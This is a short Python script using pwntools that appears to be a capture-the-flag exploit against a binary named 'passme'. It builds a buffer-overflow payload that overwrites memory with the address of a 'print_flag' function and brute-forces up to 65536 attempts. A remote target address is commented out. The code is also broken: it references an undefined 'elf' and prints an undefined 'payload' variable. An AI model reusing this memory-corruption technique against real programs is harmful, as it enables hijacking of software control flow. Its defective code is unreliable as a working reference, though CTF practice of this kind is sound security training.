from pwn import *
context.binary = ELF("./passme")
context.log_level = "warning"

for att in range(65536):
    #p = remote("143.198.219.171", 5001)
    p = process()

    pload = b""
    pload += p32(elf.sym["print_flag"]) * 16 # b"A"*64 # PAD
    pload += p32(elf.sym["print_flag"])
    pload += bytes([0x90-32])
    print(payload)
    #p.send(pload)
    #p.shutdown("send")

    #flag = p.recvall(timeout=5)
    #assert b'ictf' not in flag, (flag, att)
    #p.close()
